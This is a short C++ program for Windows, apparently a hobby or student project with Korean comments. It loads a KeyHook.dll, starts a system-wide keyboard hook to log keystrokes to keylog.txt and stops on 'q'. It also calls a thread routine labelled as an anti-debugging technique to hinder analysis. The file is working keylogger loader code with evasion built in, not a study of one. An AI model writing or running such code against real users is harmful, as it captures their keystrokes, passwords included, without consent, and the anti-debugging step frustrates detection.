#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include "create_thread_mod.h"
#include <fstream>
#include <iostream>
#include <filesystem>
using namespace std;

#define DEF_DLL_NAME "KeyHook.dll"
#define DEF_HOOKSTART "HookStart"
#define DEF_HOOKSTOP "HookStop"
#define LOG_FILE "keylog.txt"

typedef void (*PFN_HOOKSTART)(); //함수포인터 
typedef void (*PFN_HOOKSTOP)(); //dll 내의 특정함수를 가져오기 위한 함수

int main(int argc, char** argv)
{
    HMODULE hDll = NULL;
    PFN_HOOKSTART HookStart = NULL;
    PFN_HOOKSTOP HookStop = NULL;
    char ch =0;

    // Anti-Debugging technique
    create_thread();

    //KeyHook.dll을 가져옴 (핸들)
    hDll = LoadLibraryA(DEF_DLL_NAME);

    if(hDll == NULL){
        printf("LoadLibrary Failed\n");
        return 0;
    }

    //KeyHook.dll -> HookStart(), HookStop() 가져옴
    HookStart = (PFN_HOOKSTART) GetProcAddress(hDll, DEF_HOOKSTART);
    HookStop = (PFN_HOOKSTOP) GetProcAddress(hDll, DEF_HOOKSTOP);
    
    //HookStart
    HookStart();
    ofstream output;
    output.open("C:\\Users\\HP450G1\\Desktop\\coding\\keylog.txt"); //logfile 생성
    output << "Key Log Save File\n" << endl;
    output.close();
    printf("Key Logging Start\n");
    printf("press 'q' to quit\n");
    while(getch()!='q');
    printf("Stop Key Logging\n");

    //HookStop
    HookStop();
    FreeLibrary(hDll); //LoadLibrary 정리

    return 0;
}